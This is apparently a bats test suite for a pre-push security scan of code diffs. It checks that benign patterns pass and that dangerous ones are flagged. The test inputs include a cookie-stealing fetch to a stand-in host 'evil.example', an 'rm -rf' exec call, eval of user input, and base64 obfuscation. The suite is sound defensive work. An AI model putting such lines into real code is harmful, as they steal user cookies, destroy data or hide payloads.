#!/usr/bin/env bats
# Pre-push security scan — guards against suspicious patterns in builder diffs.
# These tests lock in two documented false-positive regressions:
#   - LIFT-545 (2026-05-12): lowercase `function ()` IIFE must NOT trip the scan
#   - LIFT-653 (2026-05-27): `RegExp.prototype.exec()` method calls must NOT trip it
# ...while real dynamic-execution / exfiltration patterns must still be caught.

load test_helper

SCAN() { echo "$PILOT_DIR/lib/security-scan.sh"; }

# Build a throwaway git repo whose `main...HEAD` diff adds a file with $1 as content.
# Leaves the shell cd'd into the repo so `run bash "$(SCAN)" main` sees it.
_diff_with() {
  local content="$1"
  local repo="$TEST_TMPDIR/scanrepo"
  rm -rf "$repo"; mkdir -p "$repo"; cd "$repo"
  git init -q -b main
  git config user.email t@test.local
  git config user.name tester
  echo "baseline" > base.txt
  git add base.txt && git commit -qm baseline
  git checkout -q -b feat
  printf '%s\n' "$content" > change.ts
  git add change.ts && git commit -qm change
}

# ── False positives that MUST stay clean ─────────────────────────────────────

# bats test_tags=fast
@test "security-scan: RegExp.exec() method call is not flagged (LIFT-653)" {
  _diff_with 'while ((match = enqueueRe.exec(src)) !== null) { count++ }'
  run bash "$(SCAN)" main
  [ "$status" -eq 0 ]
}

# bats test_tags=fast
@test "security-scan: lowercase function() IIFE is not flagged (LIFT-545)" {
  _diff_with 'const x = (function () { return 1 })()'
  run bash "$(SCAN)" main
  [ "$status" -eq 0 ]
}

# bats test_tags=fast
@test "security-scan: ordinary code with no suspicious pattern is clean" {
  _diff_with 'export const add = (a: number, b: number): number => a + b'
  run bash "$(SCAN)" main
  [ "$status" -eq 0 ]
}

# ── Real threats that MUST be caught ─────────────────────────────────────────

# bats test_tags=fast
@test "security-scan: bare exec( call is flagged" {
  _diff_with 'exec("rm -rf /tmp/x")'
  run bash "$(SCAN)" main
  [ "$status" -ne 0 ]
  [[ "$output" == *"Dynamic code execution"* ]] || return 1
}

# bats test_tags=fast
@test "security-scan: child_process import is flagged" {
  _diff_with 'import { execSync } from "child_process"'
  run bash "$(SCAN)" main
  [ "$status" -ne 0 ]
}

# bats test_tags=fast
@test "security-scan: eval() is flagged" {
  _diff_with 'eval(userSuppliedInput)'
  run bash "$(SCAN)" main
  [ "$status" -ne 0 ]
}

# bats test_tags=fast
@test "security-scan: Function constructor is flagged (case-sensitive)" {
  _diff_with 'const f = new Function("return 1")'
  run bash "$(SCAN)" main
  [ "$status" -ne 0 ]
  [[ "$output" == *"Function constructor"* ]] || return 1
}

# bats test_tags=fast
@test "security-scan: network exfiltration (fetch) is flagged" {
  _diff_with 'fetch("https://evil.example/" + document.cookie)'
  run bash "$(SCAN)" main
  [ "$status" -ne 0 ]
}

# bats test_tags=fast
@test "security-scan: base64 obfuscation (atob) is flagged" {
  _diff_with 'const payload = atob("ZXZpbA==")'
  run bash "$(SCAN)" main
  [ "$status" -ne 0 ]
}
